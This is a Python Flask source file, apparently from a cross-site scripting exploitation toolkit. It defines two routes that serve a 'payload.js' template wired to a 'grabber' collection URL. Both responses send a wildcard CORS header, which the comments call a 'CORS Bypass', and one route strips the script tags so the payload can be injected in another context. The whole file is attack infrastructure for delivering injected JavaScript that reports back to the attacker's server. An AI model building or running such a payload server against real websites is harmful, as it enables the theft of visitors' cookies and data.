from flask import Blueprint, render_template, request
import flask
payload = Blueprint('payload', __name__)

@payload.route('/js')
def index():
	# Set the grabber url
	grabber = request.url.replace('js','lab/grabber')
	resp = flask.Response( render_template('payload.js', url=grabber) )

	# CORS Bypass - Access-Control-Allow-Origin: *
	resp.headers['Access-Control-Allow-Origin'] = '*'
	return resp

@payload.route('/js2')
def indexjs2():
	# Set the grabber url
	grabber = request.url.replace('js2','lab/grabber')
	resp = flask.Response( render_template('payload.js', url=grabber).replace('<script>','').replace('</script>','') )

	# CORS Bypass - Access-Control-Allow-Origin: *
	resp.headers['Access-Control-Allow-Origin'] = '*'
	return resp
